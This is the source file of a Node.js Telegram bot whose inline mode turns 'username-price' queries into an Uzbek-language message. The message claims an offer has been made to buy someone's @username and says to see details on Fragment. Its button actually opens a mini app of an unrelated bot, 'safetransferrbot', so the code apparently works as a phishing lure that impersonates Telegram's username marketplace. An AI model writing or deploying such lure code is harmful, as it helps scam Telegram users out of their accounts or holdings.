const bot = require("./bot");
const express = require("express");


const app = express();
app.use(express.json());

const TOKEN = process.env.BOT_TOKEN;

bot.setWebHook(`${process.env.RENDER_EXTERNAL_URL}/webhook/${TOKEN}`);

app.post(`/webhook/${TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.on("inline_query", (query) => {

    const text = query.query;
    console.log(query);
    // Foydalanuvchi nomi faqat harflardan yoki harf+_ yoki harf+raqam+_ bo'lishi mumkin
    // Username: @username yoki username, keyin - va 2-5 xonali raqam
    if (!/^@?[A-Za-z0-9_]+-(?:[1-9]\d|[1-9]\d{2,3}|10000)$/.test(text)) return;

    const match = text.match(/^@?([A-Za-z0-9_]+)-(\d{2,5})$/);
    const name = match[1]
    const price = match[2];

    const params = btoa(JSON.stringify({ name, price, chatId: query.from.id }));
    const message = `@${name} usernameni sotib olish uchun taklif yuborildi! Tafsilotlarni ko'rish uchun Fragment-ga tashrif buyuring:`

    const results = [
        {
            type: "article",
            id: "1",
            title: message,
            input_message_content: {
                message_text: message,
            },
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Taklifni ko'rish", url: "https://t.me/safetransferrbot/transfer?startapp=" + params },
                    ],
                ],
            }
        },
    ];
    bot.answerInlineQuery(query.id, results, { cache_time: 0 });
});


const PORT = 10001;
app.listen(PORT, () => {
    console.log(`Bot server running on port ${PORT}`);
});

module.exports = bot;
